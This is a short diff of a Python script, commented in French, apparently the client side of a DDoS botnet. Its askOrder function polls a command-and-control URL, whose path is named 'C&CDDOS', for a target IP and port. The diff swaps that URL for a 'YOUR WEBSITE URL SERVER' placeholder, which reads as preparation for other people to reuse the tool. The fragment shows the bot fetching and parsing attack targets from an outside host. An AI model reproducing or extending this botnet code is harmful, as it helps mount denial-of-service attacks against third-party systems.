@@ -54,7 +54,7 @@ def waiting():
 
 def askOrder():
 	print("C'est l'heure!\nVerification de la cible sur le serveur...")
-	page = urllib.request.urlopen('https://iproc.fr/C&CDDOS/' )
+	page = urllib.request.urlopen('YOUR WEBSITE URL SERVER' )
 	ipport= str(page.read()).replace("b",'').replace("'",'')  			# On format le résultat de b'ip:port' à ip:port
 	cible = ipport.split(':')
 	if len(cible) != 2:
